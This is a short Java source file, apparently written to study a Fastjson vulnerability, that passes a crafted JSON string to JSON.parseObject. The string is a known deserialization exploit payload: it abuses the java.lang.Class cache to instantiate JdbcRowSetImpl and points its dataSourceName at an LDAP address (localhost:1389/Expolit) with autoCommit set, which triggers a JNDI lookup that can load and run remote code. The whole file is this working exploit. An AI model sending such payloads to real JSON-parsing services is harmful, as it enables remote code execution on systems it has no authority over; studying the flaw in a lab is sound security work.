package com.fastjsonStudy;

import com.alibaba.fastjson.JSON;

public class Server{
    public static void main(String[] args) {
        String payload = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
                "\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Expolit\",\"autoCommit\":true}}";
        Object obj = JSON.parseObject(payload);
        System.out.println(obj);
    }

}